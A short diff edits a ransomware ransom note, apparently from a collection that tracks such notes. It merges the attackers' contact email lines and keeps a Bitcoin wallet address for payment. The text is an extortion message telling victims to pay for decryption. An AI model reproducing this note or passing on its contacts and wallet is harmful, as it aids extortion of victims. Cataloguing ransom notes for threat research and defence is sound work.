@@ -14,9 +14,7 @@ DO NOT DELETE readme files.
 This may lead to the impossibility of recovery of the certain files.
 
 To get info (decrypt your files) contact us at
-WayneEvenson@protonmail.com
-or
-WayneEvenson@tutanota.com or todd@tmouserlaw.com
+WayneEvenson@protonmail.com or todd@tmouserlaw.com
 
 BTC wallet:
 14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk
